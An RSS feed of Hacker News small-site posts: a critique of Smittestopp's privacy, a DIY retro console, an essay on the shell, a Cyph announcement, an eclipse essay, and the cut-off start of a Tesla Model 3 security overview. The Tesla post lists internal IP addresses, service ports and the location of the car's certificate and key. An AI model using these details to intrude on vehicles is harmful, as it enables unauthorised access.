<p>The use and communications of static device identifiers makes it possible to track or impersonate others, trace users in limited/partial leaks, and so on. Just about <em>every</em> other proposed solution (both protocol specifications, and existing apps) use "rolling" identifiers in one form or another. </p>
<p>Data was temporarily stored in an unencrypted database on user devices in previous versions of the app, which made it possible to inject or modify data before uploading it to the server.</p>
<p>The application connects to a cloud solution using an everlasting connection string, using no other session handling.</p>
<p>All of this means that data integrity cannot be guaranteed, at least in the parts of the dataset collected before fixes for some of these issue was released.</p>
<h2>Identifying users and analytics data</h2>
<p><img src="https://www.eivindarvesen.com/content/blog/2020/06/27/silhouette.jpg" alt="Silhouette of man" title="Silhouette of man"></p>
<p>In order to use the application, users have to register their phone number (de facto identifying themselves). Functionally, there is no need to identify any involved party. Even in contact tracing, users could be notified by the application when a contact has been diagnosed with COVID-19 by health authorities.
One could argue that registration is a mechanism that protects against bogus uploads to some extent – but this, in addition to protection of privacy, is in a sense built-in to decentralized approaches that demands human intervention before any upload takes place (e.g. distributing upload-codes, in the case of DP-3T) – many of which also lets users choose specificly what timespans to share.</p>
<p>Smittestopp was also found to be uploading analytics data (including potentially fingerprintable information) on just about any interaction the users do with the application –&nbsp;without telling users this (it was not stated in the privacy policy) or letting them choose whether they want to upload this data.</p>
<h2>Legal implications</h2>
<p><strong>Note:</strong> <em>I am not a lawyer. Read my reflections with this in mind.</em></p>
<p>The regulation that is the formal basis for processing of the data mentions that health- and location data collected for this purpose can not be shared with law enforcement, etc.
Bluetooth-data, however, is not mentioned. I interpret this as sharing of Bluetooth-data being permitted. This would mean that parties the data is shared with could be able to, for instance, build social graphs of the data subjects.
Though the regulation puts in place certain limitations …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.eivindarvesen.com/blog/2020/06/27/my-reflections-on-smittestopp">https://www.eivindarvesen.com/blog/2020/06/27/my-reflections-on-smittestopp</a></em></p>]]>
            </description>
            <link>https://www.eivindarvesen.com/blog/2020/06/27/my-reflections-on-smittestopp</link>
            <guid isPermaLink="false">hacker-news-small-sites-24269039</guid>
            <pubDate>Tue, 25 Aug 2020 07:51:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[DIY Single-Chip 2D Retro Game Console]]>
            </title>
            <description>
<![CDATA[
Score 124 | Comments 25 (<a href="https://news.ycombinator.com/item?id=24268585">thread link</a>) | @0xmarcin
<br/>
August 24, 2020 | http://www.voja.rs/PROJECTS/GAME_HTM/1_intro.htm | <a href="https://web.archive.org/web/*/http://www.voja.rs/PROJECTS/GAME_HTM/1_intro.htm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <td rowspan="4">
      <div>
			<iframe width="420" height="315" src="//www.youtube.com/embed/VbTwWFwbsE4" frameborder="0" allowfullscreen=""></iframe>
			<p>
			<img height="420" src="http://www.voja.rs/PROJECTS/GAME_HTM/console.jpg" width="600"></p>
			<p>This 
			DIY project offers the
            simple stand-alone VGA game console which is based on <b> PIC24EP512GP202</b>  microcontroller.
            As the video signal and the corresponding sync signals are generated by software, 
			the console contains a
            minimum of hardware. There is also an audio signal output with five binary tone channels, mixed by 
			a 
			passive resistor network. Two of those channels are used for sound effects,  
			similar to ones used in video games of that time (early eighties) and 
			three for background music. This output is capable of driving line 
			output for PC speakers or headphones.</p>
			<p>
			It should be noted that there is no video processing unit, PGA or 
			any special purpose chips, and that PIC microcontrollers are not 
			designed for video signal generation. Everything is achieved by a 
			series of different design tricks and some compromises.</p>
			<p>
			This is an open hardware and open software project. Video 
			and audio generators, which are the vital parts of the firmware, are 
			the parts of the operating system, which will soon be documented, and can be used 
			for any other game or application. As the timings are critical, those parts 
			are written in assembly language, but all the other parts of the 
			program (scenario for some other games or any other application) may 
			also be written in some other programming language, preferably 
			Microchip's C. In this case all parts are written in Assembler, but 
			only as a result of author's preference.</p>
			<p>
			At the moment, only the game Jumping Jack is written for the 
			platform, well known to those who played with the Spectrum personal 
			computer back in the day. However, once a new game is created, it is 
			easy to download it from the computer, via 
			the serial port. The console has a USB connector, but it is used 
			only for 5V power supply. Unfortunately, microcontrollers which are 
			packed in DIP packages (with thru-hole soldering, convenient for DIY 
			projects and workshops) do not have USB interface but only serial ports, so 
			you have to use RS 232 to download the new game instead of Jumping 
			Jack, which is deafult in this project.</p>
			<p>
			If you want to build this console, you need the PCB and components 
			which are listed <span><strong>
			<a href="http://www.voja.rs/PROJECTS/GAME_HTM/2.%20Hardware.htm#BOM">here</a></strong></span>. 
			To program the microcontroller, you should need a PIC programmer (e.g. 
			<strong>PICKIT3</strong>, avaliable <span><strong>
			<a href="http://www.microchipdirect.com/ProductSearch.aspx?Keywords=PG164130">here</a></strong></span>) and
			<strong>MPLAB X IDE</strong> software, available <span><strong>
			<a href="http://www.microchip.com/pagehandler/en-us/family/mplabx/">here</a></strong></span>. 
			But if you want to know how PIC generates video and audio signals by 
			software in real time, or even if you feel ambitious enough to 
			create your own game for this platform, please visit the
			<span>
			<strong><a href="http://www.voja.rs/PROJECTS/GAME_HTM/2.%20Hardware.htm">next page</a></strong></span></p>
          </div>
    </td>
  </div></div>]]>
            </description>
            <link>http://www.voja.rs/PROJECTS/GAME_HTM/1_intro.htm</link>
            <guid isPermaLink="false">hacker-news-small-sites-24268585</guid>
            <pubDate>Tue, 25 Aug 2020 06:23:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Renaissance of the Shell?]]>
            </title>
            <description>
<![CDATA[
Score 41 | Comments 59 (<a href="https://news.ycombinator.com/item?id=24268533">thread link</a>) | @dwmkerr
<br/>
August 24, 2020 | https://effective-shell.com/docs/part-1-transitioning-to-the-shell/6-the-renaissance-of-the-shell/ | <a href="https://web.archive.org/web/*/https://effective-shell.com/docs/part-1-transitioning-to-the-shell/6-the-renaissance-of-the-shell/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>This is the first of the “interludes” which end each section of the book. They don't teach any specific skills but instead give a little flavour and background about the world of the shell, Linux and modern computing.</p><p>In this first interlude we'll look at just why the shell is experiencing something of a renaissance in the modern age of IT.</p><p>To be honest, it is hard to know whether there is an increase in popularity of the use of the shell and command-line tooling in general. There are data sources which indicate there is more widespread usage amongst the technical community - Stack Overflow tag popularity is one. LinkedIn data on desired skillsets is another. However, disassociating whether there is a general increase in the need for diverse technical skillsets and whether there is a <em>specific</em> increase in the popularity of keyboard and script operated systems is a challenge.</p><p>For the purposes of this chapter, we'll instead examine changes in the technology landscape over the last few decades and consider what those changes might mean for the shell, the command-line and similar tools.</p><p>We'll look at three specific developments in technology:</p><ul><li>Diversity of programming languages</li><li>Convergence of operating platforms</li><li>DevOps</li></ul><p>Each of these developments has a potentially profound impact on how we work with computers, and might hint at the long term need for shell skills.</p><p>So let's look at some of the key changes in the technology landscape over recent years and consider how they might affect the popularity and importance of the shell.</p><h2 id="the-diversity-of-programming-languages">The Diversity of Programming Languages</h2><p>There have been many programming languages and platforms over the years. But in recent years it is possible that the diversity has increased at a greater rate than ever before.</p><p>With the advent of the internet and the increase in the size of the online technical community, programming has in a sense become more democratised (which we will discuss a little more in the ‘citizen coder’ section). When in the past it was necessary to find physical books or teachers and tutors to learn a programming language, students can now find a wealth of resources online.</p><p>It is perhaps this democratisation which has led to a startlingly diverse world of programming languages. For many years, there were a small number of ‘general purpose’ languages, and a larger number of highly specialised languages (and associated platforms).</p><p>“C”, and later, “C++” were the go-to languages for systems programming (sometimes backed up by assembly language). This was the language which kernels and compilers were written in.</p><p>“Java” become the ‘general purpose’ language of choice for applications which had to run on many systems. “Basic” and later “C#” were the standards for Windows platform development. PHP was a staple for web development.</p><p>Alongside these giants were the workhorses for specific use cases. Erlang was (and is) a language which is highly popular in the telecommunications industry, where high availability and reliability were paramount. COBOL was the language for the financial industry, where mission critical systems ran on mainframes (and many still do).</p><p>Of course there were many other languages, but many of these other languages were highly specific, in a sense C, Java, PHP and later C# dominated the landscape.</p><p>Transition to the time of writing. In the Stack Overflow 2020 Technology Survey[^1], the top ten languages most wanted by employers are:</p><ul><li>Python</li><li>JavaScript</li><li>Go</li><li>TypeScript</li><li>Rust</li><li>Kotlin</li><li>Java</li><li>C++</li><li>SQL</li><li>C#</li></ul><p>Some of our old friends are there, but there are many new languages, languages which are evolving quickly. Later on in the list we will see Swift, Dart, Ruby, Haskell, Scala. There are many programming languages which are extremely popular today.</p><p>Why does this matter for the shell? The answer is that for <em>many</em> new languages, developer tooling is not as mature (some might say bloated) as it is for the ‘Workhorse’ languages. Java developers are likely very familiar with the Eclipse IDE, Microsoft shops will be familiar with Visual Studio. These are products which have been evolving for years (or decades) to support developers with rich integrated development environments.</p><p>For server-side JavaScript, Golang, Rust, Python and other languages, the development environment really is the shell. Modern editors like Visual Studio Code, Atom and so on provide a vast amount of support and tooling, encompassing the features of a full fledged IDE if the user wants. But for modern programming languages, users often have <em>had</em> to rely on the shell to compile, transpile, manage packages, bundle and so on. The average developer today is perhaps much more likely to have to use the shell - to manage Python virtual environments one day, to run Node.js another, to install packages for Golang another.</p><p>In time tooling will likely catch up and provide a ‘friendly’ interface on top of these operations, but many engineers have realised (or always known) that direct access to simple command line tools can be <em>extremely efficient</em> when working, and that overly featured IDEs can get in the way and hide complexity.</p><p>The modern programming is often polyglot - having to be at least familiar in a number of languages. The shell provides a common environment and interface for tooling, which is accessible by all, without installing many complex components, for both development and runtime environments.</p><h2 id="convergence-of-operating-platforms">Convergence of Operating Platforms</h2><p>Whilst the variety in programming languages and developer tooling may have increased, in many ways the <em>operating platforms</em> engineers use have become more homogeneous.</p><p>In the early days of computing, each operating environment was highly diverse. There were many systems which were used for production and many of them were highly proprietary. Even popular application servers were often closed source and highly specialised.</p><p>The modern execution environment however is often fairly uniform. A Linux-like system, with few customisations, which the developer or operator can tweak to suit their needs.</p><p>More and more enterprise users have moved away from proprietary Unix platforms to Linux platforms (whether commercial or non-commercial). The earliest cloud environments were using open-source Linux distributions as the available operating systems.</p><p>Even Windows has increasing support for Linux-like operation, in the form of the Windows Subsystem for Linux.</p><p>Perhaps the greatest movement in this area has been the rapid adoption of Docker as a common container technology. Containers, or container-like systems have been around for a long time, but Docker brought containers to the masses. With Docker, engineers expect operating environments to be even more uniform and Linux-like.</p><p>This has made knowledge of the shell extremely valuable. For any containerised workloads, Linux and shell skills are crucial. Kubernetes (as an execution environment) has standardised things even more.</p><p>Whilst there are still many workloads which run on proprietary systems, modern solutions are often built to run in containers on Linux. The shell has historically been the most common way to manage Linux systems, and the standardisation of operating environments around Linux, or Linux-like systems has made shell skills even more critical.</p><h2 id="devops">DevOps</h2><p>Love it or hate it, DevOps has exploded in popularity. DevOps engineers, site-reliability engineers, these kinds of roles may have been unheard of in companies not that long ago and are now becoming ubiquitous.</p><p>In attempting to unify the goals of development and operation of software, DevOps represents an organisational and cultural change. Rather than having one group focus on feature development and another group focus on reliable software operations, a single group is responsible for both. The theory is that this encourages software engineers to also consider security, reliability, maintainability etc, and operators to also consider speed of delivery.</p><p>Regardless of whether teams are genuinely combined, or specialised roles are added to teams, or even if teams are still separated, the lines between development and operations blur somewhat. Software developers are expected to build and plan with knowledge of the execution environment, operators are expected to work with developers to build features which support reliability.</p><p>The intersection of these two roles often is in the realm of automation. Automated deployments after testing, automated failover in case of errors, automated alerting when potential issues are discovered, automated provisioning of environments, automated scaling of systems when load increases.</p><p>The world of automation is intimately linked to the world of the shell and in particular shell scripting. Many tasks which require automation can be easily achieved using shell scripts. Many aspects of modern environments (such as cloud environments) support provisioning and management of services via scripting. In fact, services which <em>cannot</em> be managed via shell scripts or simple interfaces are increasingly becoming obsolete. If it cannot be scripted, it cannot be automated, and the increasingly complex systems we build <em>require</em> automation.</p><p>In practice, this means software engineers are far more likely to have to build shell scripts (or at least understand how to interface with systems via the shell) than they perhaps might have been. Similarly, operators are far more likely to have to <em>program</em> automated routines to manage high availability and so on. Again, the shell and shell scripts are a common way to manage this (even if they are simply entrypoints to more complex systems, such as scripts which execute programs).</p><p>The rise in popularity of DevOps as a set of practices and beliefs has perhaps made the shell more popular, and more important, than any other recent developments in software engineering.</p><p>And for these reasons and many more, learning how to use the shell effectively has never been more relevant or practical.</p></article></div>]]>
            </description>
            <link>https://effective-shell.com/docs/part-1-transitioning-to-the-shell/6-the-renaissance-of-the-shell/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24268533</guid>
            <pubDate>Tue, 25 Aug 2020 06:13:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cyph and PGP – An Alternative to Keybase]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24268298">thread link</a>) | @LaSombra
<br/>
August 24, 2020 | https://www.cyph.com/blog/cyph-pgp | <a href="https://web.archive.org/web/*/https://www.cyph.com/blog/cyph-pgp">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><main><article><div><div><p><img src="https://www.cyph.com/wp-content/uploads/2020/06/AdobeStock_296619919.png?ef8fdd9eb11b8a5b7c39e3671fa0de8da9750a94d0c5b7339c6f8a91bd5dd134b356d2c31d8f0742a87b385c263376447a98a62bed24dfa27e7dfaa20e370124" alt="Cyph + PGP"></p></div></div></article><section><div><p><span>One of our major competitors, Keybase, was </span><a href="https://news.ycombinator.com/item?id=23102430"><span>acquired by Zoom</span></a><span> last month.</span></p><p><span>Many Keybase users are now </span><a href="https://news.ycombinator.com/item?id=23103386"><span>looking for alternatives</span></a><span> as a result, primarily due to a lack of trust in the new ownership to maintain high privacy standards, as well as speculation that the service is now doomed to ultimately be shut down. However, no single solution has so far stood out from the crowd; instead, users are faced with the prospect of setting up a hodgepodge of independent solutions.</span></p><p><span>Keybase is great, but a full alternative is clearly needed. That’s why we’ve spent the past month building new features to make Cyph more of a direct replacement.</span></p><p><img src="https://www.cyph.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-10-at-4.38.11-PM-1024x640.png?9e56b59e17dd8d0c24ced228ed7ea88c2bcabfe24b86ae53a95ba06df0fb6d2b2fa818ab92622828b0eba4e32774328f7715ea8cc2eb380f2f14521decd6842b" alt="" width="560" height="350"></p><p><span>Cyph’s features and general architecture are similar in many ways to Keybase, plus/minus a few features:</span></p><ul><li><span>On the plus side, our features include voice/video calling (with group support), Bitcoin, and social networking (like Twitter, but all posts are signed + optionally encrypted for a subset of your contacts).</span></li><li><span>On the minus side, Keybase offers some awesome niche features (like encrypted git repos) that we currently do not.</span></li><li><span>And now, with our latest release, we’ve built out a set of PGP key management and utility features to make Cyph more immediately useful for users coming from Keybase.</span></li></ul><p><img src="https://www.cyph.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-10-at-4.39.49-PM-1024x640.png?f0bd1ee3132c87cc78b8cedeb60710eeb23fd5a7f872ad008ea828201a5fddb2fc486aab5a5ddcc0f006233616219034b2a9fb46fd4f93ec95de99dc175143cc" alt="" width="560" height="350"></p><p><span>Additionally, the architecture of Cyph yields some </span><i><span>significant</span></i><span> broader advantages:</span></p><ul><li><span>Full web support</span><ul><li><span>Whereas Keybase splits up its features between the web UI, the CLI, GPG, and the native apps, thanks to </span><a href="https://www.cyph.com/websign"><span>WebSign</span></a><span> Cyph is able to provide a consistent experience across all platforms. The full functionality is available regardless of whether you use </span><a href="https://cyph.app/"><span>https://cyph.app</span></a><span> or the desktop and mobile apps, with no need to worry about degraded security on the web.</span></li></ul></li><li><a href="https://www.cyph.com/agse"><span>Automatic strong public key authentication</span></a><span> for all users</span><ul><li><span>No need to verify keys or usernames out of band, meet up in person to compare fingerprints or “Safety Numbers”, etc.</span></li></ul></li><li><a href="https://www.cyph.com/blog/quantum-resistance"><span>Quantum-resistant cryptography</span></a><ul><li><span>Post-quantum encryption, key exchange, and signing algorithms are used throughout the application (in combination with classical crypto such as elliptic curves). Whereas others are still planning long-term migrations to post-quantum crypto, Cyph was built with it in mind from the start, meaning that your private data is theoretically protected from future QC attacks </span><i><span>today</span></i><span>.</span></li></ul></li></ul><p>We encourage you to submit a response to <a href="https://docs.google.com/forms/d/e/1FAIpQLSdMOdjPKf1O3jb2vBURF5N-UGsr08XLO6GJazlUOy1r_sCnKQ/viewform">our poll</a><span> to vote on the missing features you’d like us to add. And if you’re a Keybase user, just include your username and email address to skip the line and get a free invite to the Cyph beta!</span></p></div></section><section></section></main></div></div></div>]]>
            </description>
            <link>https://www.cyph.com/blog/cyph-pgp</link>
            <guid isPermaLink="false">hacker-news-small-sites-24268298</guid>
            <pubDate>Tue, 25 Aug 2020 05:15:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Animal behavior during a solar eclipse]]>
            </title>
            <description>
<![CDATA[
Score 55 | Comments 36 (<a href="https://news.ycombinator.com/item?id=24268252">thread link</a>) | @everbody
<br/>
August 24, 2020 | https://readwildness.com/23/poli-eclipse | <a href="https://web.archive.org/web/*/https://readwildness.com/23/poli-eclipse">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				
				<p><span>The farm dimmed mid-afternoon</span>, dipping into dusk-light. Beside the parked tractors, we passed around a block of green glass from a welder’s helmet and took turns looking through it up at the sky. I chewed a single pebble of a snap pea in my mouth. That was the size of the sun through the glass, I thought, no bigger than a pea, a sliver missing as if chewed by a caterpillar or potato beetle.</p>
				
				<p>In a total solar eclipse, photosynthesis slows down. Plants, which turn to face the sun throughout the day, may change direction, feeling for the light. Without the sun, they become unmoored. Lost in the dark. In the 2017 eclipse, changes in light intensity were attributed to bees going temporarily still. Observers in the path of totality—the stretch of land where the sun goes fully dark—reported fireflies emerging, crickets chirping. Night behavior bleeding into day.</p>
				
				<p>I stared through the glass. Sun the size of a blueberry. Size of a chrysanthemum bud.</p>
				
				<p>We wouldn’t get to see the total eclipse—that dramatic upheaval of the afternoon’s forward march, an ebb when there should be flow. The path of totality was south of us, stretching from Oregon to South Carolina. Still, the light waned at our small farm. Contrast became muted, the sky and hayfields feeling duller, softer. The zinnia patch still sparked with its shocks of red, orange, pink, yellow, but the flowers seemed unsure of themselves. The shadows from the trees did strange things, cast crescent-shaped spells on the ground, reminding me of the light funneled through a dime-store kaleidoscope. Someone arrived with a pair of glasses—the kind made from plastic and cardboard that they’d been selling at gas stations for months, running out in the final few days. We passed them around, but <span>I preferred the welding glass, the way it turned the sliver of sun goblin-green.</span></p>
				
				<p>Sun the size of a kernel of the summer’s first sweet corn; the size of a worm, coiled inside an ear from the later crop, chewing on its silky tassel.</p>
				
				<p>During a total solar eclipse, dairy cows have been known to return to their barn as the sun and sky darken. Orb-weaving spiders have been observed taking down their webs during totality, then rebuilding them <span>when the sun reappears. Some species of birds will sing out their night calls,</span> then go to their roosts, falling silent; when the sun reappears, they start their morning rituals. In this sense, the eclipse is a microcosm of night, the dark sped up, the hour hand spinning around a clock at a horse’s trot.</p>
				
				<p>Sun the size of a pepper seed. Size of a flea beetle. A ladybug resting on a windowsill. A thistle bur stuck to a coat.</p>
				
				<p>There is no evidence that an eclipse affects the behavior of horses, but nevertheless, there will be some owners who usher them into the safety of the barn before the sky goes dark. This is a form of love which happens to involve a kind of captivity.</p>
				
				<p>Sun the size of a nostril, size of a belly button, a baby’s tooth, a fingertip. Size of the chunk of flesh I’d sliced off the top of my thumb one day when I was careless with a head of cauliflower. It bled so much and so steadily that I ran to the back of the farm stand where someone sat me down on a bench to bandage the cut. I remember they held my hand so carefully, tilting it one direction then the other, saying twice, maybe three times, <i>You need to be more careful</i>.</p>
				
				<p>Once we’d passed around the glass, we scattered to our different jobs. I drove back to the snap pea patch, where I continued filling a bucket with round, ripe pods. I heard a tractor starting, the exhaust clearing its throat, then watched from where I was crouched as someone connected a hay rake to the back and pulled back onto the road, headed for one of the higher fields, leaving a cloud of dust and acres of silence behind. I realized then that the birds, which were usually a constant chorus, had gone quiet—the small snapping of my hands plucking peas from their vines, the only noise that reached me. I stood, stretching, and looked at the sky, the familiar fields—their flat, muted light. I stood there looking at the farm that for years I had grown to know and care for, and I thought of scale—of how the land surrounding me had come to feel like it was my own body, a breathing, pulsing creature that could weep or swell; and, at the same time, how the land felt unthinkably large—a roaring sun—the weight of it and of the people who worked it reaching deep into the smallest cracks and crevasses of my life like the tendrilled arms of solar flares bursting.</p>
				
				<p>I thought of all of this as I rolled another snap pea over my tongue, biting down, tasting the small eruption of green. Then I bent down, knees to dirt, to finish my work.</p>
				
				<hr>
				
				<p>Read more from <a href="https://readwildness.com/23">Issue No. 23</a> or share  on <a href="http://www.facebook.com/share.php?u=http://readwildness.com/23/poli-eclipse">Facebook</a> and <a href="https://twitter.com/share?url=http://readwildness.com/23/poli-eclipse&amp;via=platypuspress&amp;related=twitterapi%2Ctwitter&amp;hashtags=wildnessjournal&amp;text=Check%20this%20out">Twitter</a>.</p>
				
			</section></div>]]>
            </description>
            <link>https://readwildness.com/23/poli-eclipse</link>
            <guid isPermaLink="false">hacker-news-small-sites-24268252</guid>
            <pubDate>Tue, 25 Aug 2020 05:02:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hacking the Tesla Model 3 – Security Overview]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24268185">thread link</a>) | @cwaffles
<br/>
August 24, 2020 | https://fn.lc/post/tesla-model-3/ | <a href="https://web.archive.org/web/*/https://fn.lc/post/tesla-model-3/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="content" itemprop="articleBody">
    <p><em>See the follow up at <a href="https://fn.lc/post/tesla-model-3-services/">Hacking my Tesla Model 3 - Internal API</a>.</em></p>
<p>I recently got a Tesla Model 3 and since I’m a huge nerd I’ve been spending a
lot of time poking at the systems and trying to reverse engineer/figure out how
to root my car.</p>
<p>I work on Machine Learning infrastructure so I’d love to be able to take a deep
look at how autopilot/FSD works under the hood and what it can actually do
beyond what limited information the UI shows. I know some people have managed to
get a copy of this.</p>






<a href="https://fn.lc/images/tesla-model-3/model-3-owned.jpg">
<amp-img src="../../images/tesla-model-3/model-3-owned.jpg" height="2048" width="3526" layout="responsive">
</amp-img>
</a>


<div>
  <p>Displaying messages on the screen using the internal API. Version 2020.12.11.1</p>

</div>


<h2 id="existing-research">Existing Research</h2>
<p>A lot of the existing knowledge about the internal systems are specific to the
older Model S cars since their security is pretty non-existent. The Model 3 (and
presumably the newer Model S/X/Y) has numerous layers of security measures. The
high level architecture is fairly similar but has been hardened a lot.</p>
<h3 id="model-3">Model 3</h3>
<ul>
<li><a href="https://github.com/lewurm/blog/issues">lewurm’s blog posts about his Model 3</a></li>
</ul>
<h3 id="model-sx">Model S/X</h3>
<ul>
<li><a href="https://twitter.com/greentheonly">green’s analysis from his older Model S</a></li>
<li><a href="https://github.com/Lunars/tesla">Lunar’s Model S MCU1 info dumps/wiki</a></li>
<li><a href="https://www.pentestpartners.com/security-blog/reverse-engineering-the-tesla-firmware-update-process/">Reverse Engineering the Tesla Firmware Update Process</a></li>
<li><a href="https://github.com/jnuyens/freedomev">freedomEV for Model S MCU1</a></li>
</ul>
<h4 id="tencent-keen-security-lab">Tencent Keen Security Lab</h4>
<ul>
<li><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Nie-Free-Fall-Hacking-Tesla-From-Wireless-To-CAN-Bus-wp.pdf">Free-Fall: Hacking Tesla From Wireless To CAN BUS</a></li>
<li><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Liu-Over-The-Air-How-We-Remotely-Compromised-The-Gateway-Bcm-And-Autopilot-Ecus-Of-Tesla-Cars-wp.pdf">Over-The-Air: How We Remotely Compromised The Gateway, BCM, and Autopilot ECUs Of Tesla Cars</a></li>
</ul>
<h2 id="tesla-security-researcher-program">Tesla Security Researcher Program</h2>
<p>Before I touched my car at all, I registered as part of the Tesla bug bounty
program and my car is a research-registered vehicle. If you’re interested in
poking at your car at all, I’d highly recommend registering as Tesla will try to
fix it if you brick your car.</p>
<blockquote>
<p>If, through your good-faith security research, you (a pre-approved, good-faith
security researcher) cause a software issue that requires your
research-registered vehicle to be updated or “reflashed,” as an act of
goodwill, Tesla shall make reasonable efforts to update or “reflash” Tesla
software on the research-registered vehicle by over-the-air update, offering
assistance at a service center to restore the vehicle’s software using our
standard service tools, or other actions we deem appropriate.</p>
</blockquote>
<p><a href="https://www.tesla.com/about/security">https://www.tesla.com/about/security</a></p>
<h2 id="internal-layout-of-the-car">Internal Layout of the Car</h2>
<p>All of the higher level components are connected via an internal Ethernet
switch. These include:</p>
<ul>
<li>cid/ice - this is the computer that controls the display and all of the media
systems such as sound.
<ul>
<li>192.168.90.100</li>
</ul>
</li>
<li>autopilot primary and secondary computers.
<ul>
<li>192.168.90.103 - ap/ape</li>
<li>192.168.90.105 - ap-b/ape-b</li>
</ul>
</li>
<li>Gateway - this is primarily UDP server that controls the switch, vehicle
config and proxies requests between the ethernet side (cid/autopilot) and the
<ul>
<li>192.168.90.102
CAN BUS to the motor controllers and sensors.</li>
</ul>
</li>
<li>Modem - this is the LTE modem
<ul>
<li>192.168.90.60</li>
</ul>
</li>
<li>Tuner - this is for the AM/FM radio. Not present on the newer Model 3 cars
including mine. Not having an AM/FM radio does seem like a safety issue so I
was surprised to see it was removed.
<ul>
<li>192.168.90.60</li>
</ul>
</li>
</ul>
<h2 id="seceth---secure-ethernet-tcam">seceth - Secure Ethernet TCAM</h2>
<p>The internal car network appears to be using a Marvel 88EA6321 as a switch. This
is an automative gigabit switch.</p>
<p>Most of the connections are using 100BASE-T1 which is a 2 wire PHY for ethernet.
The autopilot computers, modem, tuner, gateway, CID all use 100Base-T1. There’s
two standard ethernet ports. One is located on the CID motherboard and has a
standard ethernet jack. The other is located in the driver side footwell and has
a <a href="https://teslaownersonline.com/threads/ethernet-port-in-driver-footwell.15045/">custom connector</a>.</p>
<h3 id="dsa">DSA</h3>
<p>The switch appears to be using something called <a href="https://www.kernel.org/doc/Documentation/networking/dsa/dsa.txt">Distributed Switch
Architecture</a>
and TCAM.</p>
<p>DSA allows the switch to be controlled by a separate processor. In the
Model 3, I believe the Gateway controls it. I haven’t seen any references to the
Linux dsa subsystem in the CID.</p>
<h3 id="tcam">TCAM</h3>
<p>TCAM is a special type of memory that can do very fast lookups/filters in a
sincel cycle. This allows for the Gateway to specify packet filters for the
switch to apply. By default the ethernet port in the driver side footwell is
disabled by these rules. The diagnostic jack on the CID motherboard can only
access port 8080 (Odin) and 22 (SSH) on the CID.</p>
<p>There is a way to disable the secure ethernet but this seems to be only
accessible via Odin by Tesla engineering and possibly service.</p>
<p>There’s apparently a daily changed code that unlocks the diagnostic
port/service mode. Service likely has to get this from Tesla via Toolbox.</p>
<h2 id="hermes---talking-to-the-mothership">Hermes - Talking to the Mothership</h2>
<p>The older Model S cars use a persistent OpenVPN connection to communicate with the
“mothership” as Tesla refers to it. All communication with Tesla go through this
VPN connection so there’s no way to sniff any of the updates.</p>
<p>Instead of using OpenVPN, the Model 3 runs a proxy service called Hermes. Hermes
is a relatively simple service that can proxy unauthenticated requests on the
CID to the mothership. Presumably maintaining persistent OpenVPN connections on
500,000+ cars wasn’t scalable so they switched to a lower overhead solution.</p>
<p>Hermes also allows Tesla to make requests to the car itself and fetch logs from
it. Presumably this is how Tesla can enable features such as Full Self-Driving
over the air without a full software update as well as do remote service.</p>
<h3 id="certificates">Certificates</h3>
<p>Every car is issued unique client certificates for Hermes/OpenVPN and they’re
periodically rotated. This makes it quite hard to do things like grabbing
firmware images or inspect Tesla’s backend since you first have to get root
access to a car.</p>
<p>These certificates live under <code>/var/lib/car_creds/car.{crt,key}</code>.</p>
<pre><code># Phone Home connects to devices over Hermes based on the
# Hermes certificate CN.
...
#     subject=
#     CN=BANGELOM300000001
#     OU=Tesla Motors
#     O=Tesla
#     L=Palo Alto
#     ST=California
#     C=US
</code></pre><p>Each car is issued a specific common name that’s only accessible internally to
make it harder for attackers to try and fake a cert. This is relevant for SSH as
we’ll see later.</p>
<h3 id="binaries">Binaries</h3>
<p>There’s a bunch of different hermes binaries. They all seem to be written in
<em>Go</em> :). It’s nice to see my favorite programming language running in my car.</p>
<pre><code>$ ls opt/hermes/
hermes_client*     hermes_fileupload*  hermes_historylogs*  hermes_teleforce*
hermes_eventlogs*  hermes_grablogs*    hermes_proxy*

$ file /opt/hermes/hermes_client
opt/hermes/hermes_client: sticky ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=JRZRLflVY89A6p67rwkt/nb9KmeWMLadrBGvRVujH/aJPtciQz8Xldpa7VcVy_/XzIY9KY7sZI0KdwLYOK5, stripped
</code></pre><p>It’s pretty easy to see what OSS libraries they’re using in the binary by using
<code>strings hermes_client | rg vendor/</code>. Maybe I’ll make a follow up post analyzing
Hermes itself.</p>
<h2 id="odin---service-interface">Odin - Service Interface</h2>
<p>Odin is a python 3 service running on every car. It’s used for various
maintenance actions on the car such as calibrating the radar and the cameras. If
you connect to the internal car network you can access it at
http://192.168.90.100:8080.</p>
<p>There’s a screenshot of this interface at <a href="https://github.com/lewurm/blog/issues/4">https://github.com/lewurm/blog/issues/4</a></p>
<p>If you try to run any of the actions on Odin it just throws an error.</p>
<h3 id="odin-authentication">Odin Authentication</h3>
<pre><code>{error: "Token 2.0 not found."}
</code></pre><p>I dug into the source code.</p>
<p><em>Tesla uses signed certificates for everything.</em></p>
<p>From a security perspective this is amazing. :) From a “I want to get root on my
car” perspective it’s awful. :(</p>
<p>Each token contains a security level. These levels grant access to different
Odin commands. This allows different tiers of service the minimum permissions
they need to do their job.</p>
<p>These are broken into <code>principals</code> and <code>remote_execution_permissions</code>.
Presumably <code>principals</code> requires physical access via the diagnostic ethernet
port.</p>
<p>The <code>principals</code> levels listed in the Odin tasks are:</p>
<ul>
